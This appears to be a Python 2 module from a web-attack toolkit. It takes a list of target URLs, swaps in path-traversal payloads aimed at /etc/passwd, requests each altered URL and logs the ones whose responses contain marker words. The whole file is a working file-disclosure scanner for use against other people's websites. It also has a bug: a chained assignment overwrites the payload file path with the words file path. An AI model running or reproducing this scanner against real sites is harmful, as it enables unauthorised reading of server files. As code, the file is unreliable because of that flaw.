import os
import requests
import time

class temp():
    language = ''
    multilang = ''

class translate():
    file_path_1 = ''
    file_path_2 = ''
    file_path_3 = ''
    file_path_4 = ''

def language():
    multilang = os.path.abspath(__file__).replace(os.path.abspath(__file__).split('/')[-2], 'settings').replace(os.path.abspath(__file__).split('/')[-1], 'multilang.ini')
    temp.multilang = multilang
    with open(temp.multilang, 'r') as file:
        lines = file.readlines()
        for i in range(len(lines)):
            if '[language]' in lines[i]:
                lang = lines[i].split('=')[1].replace(' ', '').strip()
                temp.language = lang
            # if '[menu_banner]' in lines[i] and '[' + lang + ']' in lines[i]:
                # print lines[i]
    with open(temp.multilang, 'r') as file:
        for line in file:
            if '[file_path_1]' in line and '[' + temp.language + ']' in line:
                translate.file_path_1 =line.split('=')[1].strip()
            if '[file_path_2]' in line and '[' + temp.language + ']' in line:
                translate.file_path_2 =line.split('=')[1].strip()
            if '[file_path_3]' in line and '[' + temp.language + ']' in line:
                translate.file_path_3 =line.split('=')[1].strip()
            if '[file_path_4]' in line and '[' + temp.language + ']' in line:
                translate.file_path_4 =line.split('=')[1].strip()


try:
    language()
    sql_dir = os.path.abspath(__file__).replace(os.path.abspath(__file__).split('/')[-2], 'settings').replace(os.path.abspath(__file__).split('/')[-1], 'filepath.ini')
    words_dir = sql_dir = os.path.abspath(__file__).replace(os.path.abspath(__file__).split('/')[-2], 'settings').replace(os.path.abspath(__file__).split('/')[-1], 'words.ini')
    new_line0 = ''
    i = 0
    save_ = open('filepath_' + str(time.time()) + '.txt', 'w')
    with open(os.path.abspath(__file__).replace(os.path.abspath(__file__).split('/')[-1],'output/') + 'urls.txt') as file:
        for line in file:
            try:
                print translate.file_path_1 + str(line).strip() + ']'
                # print line.replace('\n', '').split('/')
                for i in range(len(line.replace('\n', '').split('/'))):
                    nnw = line.replace('\n', '')
                    new_line0 = line.replace('\n', '').split('/')[-1]
                    with open(sql_dir, 'r') as file: 
                        for line in file:
                            new_line1 = new_line0.replace(new_line0, line).replace('{FILE}', 'etc/passwd')
                            # print nnw, new_line1
                            ddeeemm = nnw.replace(new_line0, new_line1)
                            if 'http' in ddeeemm:
                                req0 = requests.get(ddeeemm).text.encode('utf-8').strip()
                                with open(words_dir, 'r') as file:
                                    for line in file:
                                        if line in req0:
                                            print translate.file_path_2 + str(ddeeemm)
                                            save_.write(line + translate.file_path_3)
                                            save_.write(ddeeemm)
            except requests.exceptions.ConnectionError:
                pass
            except requests.exceptions.InvalidSchema:
                pass
            except KeyboardInterrupt:
                exit()

    print translate.file_path_4
    save_.close()
    raw_input()
except Exception as e:
    print e.message, e.args
except KeyboardInterrupt:
    exit()